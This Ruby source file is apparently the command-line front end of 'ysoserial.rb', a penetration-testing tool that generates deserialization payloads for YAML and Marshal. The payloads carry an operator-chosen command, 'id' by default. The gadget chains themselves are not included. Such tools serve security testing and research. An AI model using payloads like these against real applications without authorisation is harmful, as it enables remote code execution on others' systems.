require "docopt"
require 'ysoserial/gadgets'

$doc = <<DOCOPT
ysoserial.rb generates deserialization payloads for a variety of ruby formatters.

Usage: ysoserial.rb [options]

Options:
  -o, --output=VALUE         The output format (raw|escaped|base64). [Default: raw]
  -g, --gadget=VALUE         The gadget chain.
  -f, --formatter=VALUE      The formatter (YAML|Marshal). [Default: Marshal]
  -c, --command=VALUE        The command to be executed. [Default: id 1>&2]
  -s, --stdin                The command to be executed will be read from 
                               standard input.
  -t, --test                 Whether to run payload locally. [Default: false]
      --raf, --runallformatters
                             Whether to run all the gadgets with the provided 
                               formatter (ignores gagdet name, output format, 
                               and the test flag). This will search in 
                               formatters and also show the displayed payload 
                               length. [Default: false]
      --sf, --searchformatter=VALUE
                             Search in all formatters to show relevant 
                               gadgets and their formatters (other parameters 
                               will be ignored).
      --debugmode            Enable debugging to show exception errors and 
                               output length
  -h, --help                 Shows this message and exit.

DOCOPT

module YSoSerial
  class CLI
    def self.start
      begin
        options = Docopt::docopt($doc)
      rescue Docopt::Exit => e
        puts e.message
      end

      # import all gadgets
      gadgets = YSoSerial::Gadgets.table

      unless options["--gadget"]
        raise "Gadget not chosen"
      end
      gadget_symbol = options["--gadget"].to_sym
      unless gadgets.include? gadget_symbol
        raise "Gadget not found"
      end

      gadget_class = gadgets[gadget_symbol]
      command = options["--command"]
      # if options["--stdin"]
      #   command = gets.chomp
      # end
      gadget = gadget_class.new(command)

      function_args = [
        options["--formatter"].downcase.to_sym,
        options["--output"].downcase.to_sym,
      ]
      if options["--test"]
        gadget.test(*function_args)
      else
        puts gadget.generate(*function_args)
      end
    end
  end
end
